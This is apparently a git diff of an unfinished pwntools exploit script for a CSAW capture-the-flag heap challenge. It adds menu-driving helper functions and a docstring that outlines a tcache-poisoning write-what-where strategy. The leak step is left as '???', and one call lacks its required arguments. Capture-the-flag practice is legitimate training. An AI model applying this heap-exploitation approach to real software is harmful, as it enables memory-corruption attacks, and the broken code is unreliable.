@@ -2,7 +2,7 @@
 
 from pwn import *
 
-if args.REMOTE:
+if not(args.LOCAL):
     conn = remote('pwn.red.csaw.io',5008)
 else:
     conn = gdb.debug('./worstcodeever', gdbscript=(''
@@ -18,11 +18,25 @@ else:
 sizeof(struct Friend) == 16
 sizeof(union identifier) == 8
 tcache is used when friends are freed
+
+Write-What-Where Strategy:
+-create a robot
+-free the robot
+-edit the robot, setting barcode to `where`
+-create another unwanted robot
+-create another robot; it will be at `where`
+-edit this robot, setting barcode to `what`
+-you have written `what` to `where`
+
+Leak Strategy:
+-???
 """
 
-def addfriend():#TODO params
-    pass#TODO
-    #set option to 1
+def addfriend(human_name, name_or_id, age):
+    print(conn.recvuntil(b'> ').decode())
+    print(b'1\n')
+    conn.sendline(b'1')
+    print(conn.recvuntil(b'?\n'))
     #set int human_name
     #if human_name != 0:
         #set char[63] name via fgets; send all 63 or use \n which will be replaced with \0 to end
@@ -30,14 +44,20 @@ def addfriend():#TODO params
         #set int64 id
     #set int age
 
-def removefriend():#TODO params
-    pass#TODO
-    #set option to 2
-    #set index
+def removefriend(index):
+    print(conn.recvuntil(b'> ').decode())
+    print(b'2\n')
+    conn.sendline(b'2\n')
+    print(conn.recvuntil(b'?\n'))
+    print(str(index).encode()+b'\n')
+    conn.sendline(str(index).encode())
+    print(conn.recv())
 
-def editfriend():#TODO params
-    pass#TODO
-    #set option to 4
+def editfriend(index, isHuman, name_or_id, age):
+    print(conn.recvuntil(b'> ').decode())
+    print(b'4\n')
+    conn.sendline(b'4')
+    print(conn.recvuntil(b'?\n'))
     #set index
     #if friend_type[index] != 0:
         #set char[63] name via fgets; send all 63 or use \n which will not be replaced but \0 will be tacked on
@@ -45,11 +65,18 @@ def editfriend():#TODO params
         #set int64 id
     #set int age
 
-def display():#TODO params
-    pass#TODO
-    #set option to 3
-    #set index
-    
+def display(index):
+    print(conn.recvuntil(b'> ').decode())
+    print(b'3\n')
+    conn.sendline(b'3')
+    print(conn.recvuntil(b'\n').decode())
+    print(str(index).encode()+b'\n')
+    conn.sendline(str(index).encode())
+    print(conn.recv())
+
+addfriend()
+display(0)
+
 conn.interactive()
 
 conn.close()
